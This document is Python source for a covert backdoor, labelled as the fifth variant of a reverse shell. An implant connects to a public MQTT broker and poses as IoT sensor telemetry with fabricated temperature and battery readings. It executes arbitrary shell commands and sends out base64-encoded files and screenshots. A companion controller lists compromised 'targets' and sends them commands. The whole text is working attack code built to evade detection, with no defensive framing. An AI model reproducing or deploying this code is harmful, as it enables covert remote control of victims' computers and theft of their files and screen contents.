'''VARIANT 5: MQTT REVERSE SHELL (IOT DISGUISE)

Change from previous: Uses MQTT protocol (common in IoT devices) - commands/responses published as MQTT topics. Looks like smart home/IoT traffic.'''
#!/usr/bin/env python3
# MQTT REVERSE SHELL - HIDES AS IOT DEVICE TELEMETRY

import paho.mqtt.client as mqtt
import subprocess
import os
import platform
import json
import base64
import time
import threading
import random
import string

class MQTTBackdoor:
    def __init__(self, broker, port=1883, username=None, password=None):
        self.broker = broker          # MQTT broker address
        self.port = port               # Usually 1883 (8883 for TLS)
        self.username = username
        self.password = password
        self.connected = False
        
        # Generate unique device ID
        self.device_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        # Topics - looks like legitimate IoT telemetry
        self.cmd_topic = f"iot/{self.device_id}/command"
        self.resp_topic = f"telemetry/{self.device_id}/response"
        self.status_topic = f"telemetry/{self.device_id}/status"
        
        # Setup MQTT client
        self.client = mqtt.Client(client_id=f"ESP32_{self.device_id}", clean_session=True)
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        self.client.on_disconnect = self.on_disconnect
        
        if username and password:
            self.client.username_pw_set(username, password)
    
    def on_connect(self, client, userdata, flags, rc):
        """Connected to broker"""
        if rc == 0:
            self.connected = True
            # Subscribe to command topic
            self.client.subscribe(self.cmd_topic)
            
            # Send connection notification disguised as telemetry
            status = {
                "device": self.device_id,
                "type": "sensor",
                "status": "online",
                "battery": random.randint(75, 100),  # Fake sensor data
                "firmware": "2.1.4",
                "host": platform.node(),
                "os": platform.system()
            }
            self.client.publish(self.status_topic, json.dumps(status))
            print(f"[+] Connected to broker as {self.device_id}")
    
    def on_disconnect(self, client, userdata, rc):
        """Disconnected from broker"""
        self.connected = False
        print("[-] Disconnected, reconnecting...")
    
    def on_message(self, client, userdata, msg):
        """Received command"""
        try:
            payload = json.loads(msg.payload.decode())
            command = payload.get('cmd', '')
            cmd_id = payload.get('id', 0)
            
            # Execute command
            result = self.execute_command(command)
            
            # Send response disguised as telemetry
            response = {
                "sensor": "cmd_response",
                "id": cmd_id,
                "value": base64.b64encode(result.encode()).decode()[:200],
                "timestamp": time.time()
            }
            self.client.publish(self.resp_topic, json.dumps(response))
            
        except Exception as e:
            error_resp = {
                "sensor": "error",
                "value": str(e)
            }
            self.client.publish(self.resp_topic, json.dumps(error_resp))
    
    def execute_command(self, command):
        """Run system command"""
        try:
            if command.startswith('cd '):
                path = command[3:].strip()
                os.chdir(path)
                return f"DIR:{os.getcwd()}"
            
            # File operations disguised
            if command.startswith('download '):
                filepath = command[9:].strip()
                if os.path.exists(filepath):
                    with open(filepath, 'rb') as f:
                        content = base64.b64encode(f.read()).decode()
                        return f"FILE:{os.path.basename(filepath)}:{content[:500]}"
            
            if command.startswith('screenshot'):
                # If PIL available, take screenshot
                try:
                    from PIL import ImageGrab
                    screenshot = ImageGrab.grab()
                    screenshot.save('temp_screen.png')
                    with open('temp_screen.png', 'rb') as f:
                        content = base64.b64encode(f.read()).decode()
                    os.remove('temp_screen.png')
                    return f"SCREEN:{content[:500]}"
                except:
                    pass
            
            # Regular command
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            return result[:500]  # Limit size
            
        except Exception as e:
            return f"ERR:{str(e)}"
    
    def send_heartbeat(self):
        """Send periodic telemetry to look legitimate"""
        while True:
            if self.connected:
                # Fake sensor data
                telemetry = {
                    "sensor": "environment",
                    "temperature": round(random.uniform(20, 30), 1),
                    "humidity": random.randint(30, 70),
                    "pressure": random.randint(980, 1020),
                    "uptime": int(time.time())
                }
                self.client.publish(f"telemetry/{self.device_id}/sensors", json.dumps(telemetry))
            time.sleep(60)  # Every minute
    
    def connect_with_retry(self):
        """Maintain connection"""
        while True:
            try:
                self.client.connect(self.broker, self.port, 60)
                self.client.loop_forever()
            except:
                time.sleep(5)
    
    def run(self):
        """Start the backdoor"""
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        heartbeat_thread.start()
        
        # Connect and stay connected
        self.connect_with_retry()

if __name__ == "__main__":
    BROKER = "mqtt.eclipseprojects.io"  # Public MQTT broker (change to your own)
    # BROKER = "your-mqtt-broker.com"   # Or use private broker
    
    backdoor = MQTTBackdoor(
        broker=BROKER,
        port=1883,
        username=None,   # Optional auth
        password=None
    )
    backdoor.run()



#mqtt command listener (Python MQTT client):
#!/usr/bin/env python3
# MQTT COMMAND CONTROLLER

import paho.mqtt.client as mqtt
import json
import base64
import time

class MQTTController:
    def __init__(self, broker):
        self.broker = broker
        self.client = mqtt.Client()
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        self.targets = {}
        self.cmd_id = 0
    
    def on_connect(self, client, userdata, flags, rc):
        print("[+] Connected to broker")
        # Subscribe to all telemetry topics
        client.subscribe("telemetry/+/status")
        client.subscribe("telemetry/+/response")
        client.subscribe("telemetry/+/sensors")
    
    def on_message(self, client, userdata, msg):
        topic = msg.topic
        payload = json.loads(msg.payload.decode())
        
        if "status" in topic:
            # New target connected
            device = topic.split('/')[1]
            self.targets[device] = {
                "host": payload.get('host', 'unknown'),
                "os": payload.get('os', 'unknown'),
                "last_seen": time.time()
            }
            print(f"\n[+] Target online: {device} - {payload.get('host')}")
        
        elif "response" in topic:
            # Command output
            value = payload.get('value', '')
            try:
                decoded = base64.b64decode(value).decode()
                print(f"\n[Output from {topic}]:\n{decoded}")
            except:
                print(f"\n[Response]: {value}")
        
        elif "sensors" in topic and "response" not in topic:
            # Just show sensor data is flowing
            print(".", end="", flush=True)
    
    def send_command(self, device_id, command):
        """Send command to specific device"""
        topic = f"iot/{device_id}/command"
        self.cmd_id += 1
        cmd_msg = {
            "cmd": command,
            "id": self.cmd_id
        }
        self.client.publish(topic, json.dumps(cmd_msg))
        print(f"[>] Command sent to {device_id}: {command}")
    
    def list_targets(self):
        """Show all connected devices"""
        print("\n=== TARGETS ===")
        for device, info in self.targets.items():
            print(f"[{device}] {info['host']} ({info['os']}) - last seen {int(time.time()-info['last_seen'])}s ago")
    
    def interactive(self):
        """Interactive control loop"""
        self.client.connect(self.broker, 1883, 60)
        self.client.loop_start()
        
        while True:
            cmd = input("\nMQTT> ").strip()
            
            if cmd.lower() == 'list':
                self.list_targets()
            
            elif cmd.lower().startswith('use '):
                target = cmd[4:].strip()
                if target in self.targets:
                    print(f"[*] Using target {target}")
                    while True:
                        target_cmd = input(f"{target}> ")
                        if target_cmd.lower() == 'back':
                            break
                        if target_cmd:
                            self.send_command(target, target_cmd)
                else:
                    print("[-] Target not found")
            
            elif cmd.lower() == 'exit':
                break
            
            elif cmd:
                print("Commands: list, use <device_id>, exit")

if __name__ == "__main__":
    controller = MQTTController("mqtt.eclipseprojects.io")
    controller.interactive()